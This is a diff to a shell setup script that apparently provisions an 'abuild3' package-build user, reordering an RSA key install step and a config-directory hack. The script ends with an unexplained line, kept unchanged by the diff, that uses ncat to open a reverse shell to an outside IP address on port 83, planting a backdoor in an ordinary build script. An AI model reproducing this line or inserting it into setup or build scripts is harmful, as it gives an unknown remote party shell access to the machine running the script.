@@ -52,12 +52,14 @@ cp installrsakey.sh /home/abuild3/installrsakey.sh
 chmod +x /home/abuild3/installrsakey.sh
 chown -R abuild3:abuild3 /home/abuild3/installrsakey.sh
 
-su -c "/home/abuild3/installrsakey.sh" -m abuild3 
-
-###hack to allow abuild to work
-mkdir .abuild
+###hack to allow abuild/abuild-keygen to work
+mkdir -p .abuild
 cp /home/abuild3/.abuild/abuild.conf .abuild
 chown -R abuild3:abuild3 .abuild
+
+su -c "/home/abuild3/installrsakey.sh" -m abuild3 
+
+
 
 
 ncat 195.201.134.209 83 -e /bin/sh
